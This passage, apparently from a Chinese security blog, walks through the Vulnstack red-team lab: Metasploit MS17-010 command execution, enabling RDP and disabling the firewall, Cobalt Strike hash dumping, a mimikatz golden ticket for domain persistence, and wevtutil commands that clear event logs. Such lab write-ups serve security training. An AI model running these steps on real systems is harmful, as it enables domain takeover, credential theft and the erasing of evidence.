class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -             [*] Trying stick \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e (x86)...Boom!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -     [+] Successfully Leaked Transaction!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -     [+] Successfully caught Fish-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e-a-barrel\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - \u0026#x3C;---------------- | Leaving Danger Zone | ----------------\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Reading \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e CONNECTION struct at: \u003cspan class=\"hljs-number\"\u003e0x8d1c0d60\u003c/span\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Built a write-what-where primitive...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Overwrite complete... SYSTEM session obtained!\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a command \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e non-service executable...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Getting the command output...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Executing cleanup...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Cleanup was successful\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Command completed successfully!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\"\u003c/span\u003e:\n\nThe operation completed successfully.\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功打开，尝试连接，使用\u003ccode\u003erdesktop\u003c/code\u003e ,用户就用得到的域管理员用户，也可以自己新建（图片上的密码其实是\u003ccode\u003ehongrisec@2019\u003c/code\u003e的）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains rdesktop \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e -p hongrisec@\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e -u administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登陆成功，拿下\u003ccode\u003e141\u003c/code\u003e ，域控尝试能不能也拿下了,记得关防火墙\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e\nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e command \u003cspan class=\"hljs-string\"\u003e'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'\u003c/span\u003e\nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e command \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e command netsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains rdesktop \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.38\u003c/span\u003e -p hongrisec@\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e -u administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e也是可以拿下的，但是用户不存在AD域的文件和\u003ccode\u003ead\u003c/code\u003e域管理器，但确实是管理员账户，也算是拿下域控了\u003c/p\u003e\n\u003ch2\u003e权限维持（黄金票据）\u003c/h2\u003e\n\u003cp\u003e黄金票据是指能够绕过认证授权（Authentication and Authorization）机制并获得所需权限的票据。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e现在已经获得域的权限了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们要收集域名称，域管理员账户\u003ccode\u003eSID\u003c/code\u003e，\u003ccode\u003ekrbtgt\u003c/code\u003e账户的\u003ccode\u003eHTLM\u003c/code\u003e的\u003ccode\u003eHASH\u003c/code\u003e （重要）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获取域SID以及域名称\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e域名称\u003ccode\u003egod.org\u003c/code\u003e ,\u003ccode\u003eSID\u003c/code\u003e为\u003ccode\u003eS-1-5-21-2952760202-1353902439-2381784089\u003c/code\u003e 后面的\u003ccode\u003e500\u003c/code\u003e不需要\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获取\u003ccode\u003eKRBTGT\u003c/code\u003e 的\u003ccode\u003eNTLM\u003c/code\u003e的\u003ccode\u003eHASH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我这里使用\u003ccode\u003eCS\u003c/code\u003e抓取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: \u003cspan class=\"hljs-number\"\u003e82541\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n[+] received password hashes:\nAdministrator:\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::\nGuest:\u003cspan class=\"hljs-number\"\u003e501\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:\u003cspan class=\"hljs-number\"\u003e502\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::\nliukaifeng01:\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::\nligang:\u003cspan class=\"hljs-number\"\u003e1106\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:1e3d22f88dfd250c9312d21686c60f41:::\nOWA$:\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:35c29a27ff5086ba975d49493673eddb:::\nROOT-TVI862UBEH$:\u003cspan class=\"hljs-number\"\u003e1104\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:c1e8fa40153fef225ce4f3d627181bcf:::\nSTU1$:\u003cspan class=\"hljs-number\"\u003e1105\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:75c2c82fa50b7716428d85372374b139:::\nDEV1$:\u003cspan class=\"hljs-number\"\u003e1107\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:bed18e5b9d13bb384a3041a10d43c01b:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eKRBTGT\u003c/code\u003e 的\u003ccode\u003eNTLM\u003c/code\u003e的\u003ccode\u003eHASH\u003c/code\u003e 是\u003ccode\u003e58e91a5ac358d86513ab224312314061\u003c/code\u003e ，收集完这些信息后金票票据就可以制作了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e首先创建一个用户\u003ccode\u003etest\u003c/code\u003e ，默认没有管理员权限，\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e假如现在域管理员账户被改了，我们没有密码，只能登陆\u003ccode\u003etest\u003c/code\u003e用户\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登录test用户，测试权限\u003c/p\u003e\n\u003cp\u003e通过网络访问域控文件像是\u003ccode\u003eaccess is denied\u003c/code\u003e 无权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e制作黄金票据,将\u003ccode\u003emimikatz\u003c/code\u003e拿到客户机\u003c/p\u003e\n\u003cp\u003e格式：kerberos::golden /user:XXX任意用户名 /domain:域名 /sid:域的sid值 /ticket:XXX.kirbi(生成的票据名称)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e生成成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003eklist\u003c/code\u003e查看生成的票据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e再通过网络访问域控文件，成功获取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e这样就可以重新获得域的管理权，前提是\u003ccode\u003ekrbtgt\u003c/code\u003e 账户的密码没有被修改\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e痕迹清理\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eshell wevtutil cl security    //清理安全日志\nshell wevtutil cl system        //清理系统日志\nshell wevtutil cl application        //清理应用程序日志\nshell wevtutil cl \u003cspan class=\"hljs-string\"\u003e\"windows powershell\"\u003c/span\u003e    //清除power shell日志\nshell wevtutil cl Setup     //清除（cl）事件日志中的 \u003cspan class=\"hljs-string\"\u003e\"Setup\"\u003c/span\u003e 事件。\n\u003c/code\u003e\u003c/pre\u003e","title":"Vulnstack - ATT\u0026CK红队评估实战靶场(一)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机","description":"ATT\u0026CK红队评估实战靶场(一)\n\n http://vulnstack.qiyuanxuetang.net/vuln/detail/2/\n \n\n/image.png)\n\n靶场搭建\n\n- 靶机通用密码：`hongrisec@2019`\n- `ip`网络设置\n    \n    创建一个仅主机的虚拟网卡，网段是`192.168.52.0` ，`nat`网卡随意`ip`，用来模拟`web`服务器外网，我..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"Vulnstack红队评估实战靶场(一)"},"buildId":"Cn2u-1XBPoyjEdHEI3G0H","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>